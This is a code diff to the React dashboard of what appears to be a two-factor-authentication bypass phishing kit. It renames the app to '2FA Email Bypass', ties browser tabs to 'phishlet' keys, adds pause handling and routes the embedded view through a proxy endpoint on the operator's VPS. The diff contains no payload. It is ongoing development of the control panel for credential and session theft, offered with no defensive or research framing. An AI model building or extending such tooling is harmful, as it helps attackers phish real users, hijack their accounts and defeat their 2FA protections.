@@ -6,7 +6,7 @@ import useAsyncAction from '../hooks/useAsyncAction'
 
 const VPS_IP = import.meta.env.VITE_VPS_IP || '127.0.0.1'
 const BASE = import.meta.env.VITE_API_URL || ''
-const APP_NAME = import.meta.env.VITE_APP_NAME || 'BTB_ATTACK'
+const APP_NAME = import.meta.env.VITE_APP_NAME || '2FA Email Bypass'
 
 function authHeaders() {
   const token = localStorage.getItem('btb_token')
@@ -65,7 +65,7 @@ export default function Dashboard() {
     return () => { cancelled = true; clearInterval(t) }
   }, [])
 
-  function addTab(url, label) {
+  function addTab(url, label, phishletKey) {
     setSidebarOpen(false)
     const existing = tabs.find((t) => t.url === url)
     if (existing) {
@@ -74,7 +74,7 @@ export default function Dashboard() {
       return
     }
     const id = ++tabIdCounter
-    setTabs([...tabs, { id, url, label }])
+    setTabs([...tabs, { id, url, label, key: phishletKey || null }])
     setActiveTabId(id)
     setIframeError(false)
   }
@@ -108,6 +108,12 @@ export default function Dashboard() {
     })
   }, [activeTabId])
 
+  const updateTabUrl = useCallback((phishletKey, newUrl) => {
+    setTabs((prev) => prev.map((t) =>
+      t.key === phishletKey ? { ...t, url: newUrl } : t
+    ))
+  }, [])
+
   const activeTab = tabs.find((t) => t.id === activeTabId)
 
   return (
@@ -129,6 +135,7 @@ export default function Dashboard() {
           loading={loading}
           onOpenBrowser={addTab}
           onContainerRemoved={closeTabsByPort}
+          onPauseToggle={updateTabUrl}
           onClose={() => setSidebarOpen(false)}
         />
       </div>
@@ -227,9 +234,11 @@ export default function Dashboard() {
                 </div>
               ) : (
                 <iframe
-                  key={activeTabId}
+                  key={`${activeTabId}-${activeTab?.url}`}
                   ref={iframeRef}
-                  src={activeTab?.url}
+                  src={activeTab?.url && !activeTab.url.includes(`:${VPS_IP}:`) && !activeTab.url.includes(':580') && !activeTab.url.includes(':590')
+                    ? `${BASE}/api/proxy?url=${encodeURIComponent(activeTab.url)}`
+                    : activeTab?.url}
                   className="w-full flex-1 min-h-[300px] sm:min-h-[400px] bg-black"
                   title={activeTab?.label}
                   onError={() => setIframeError(true)}
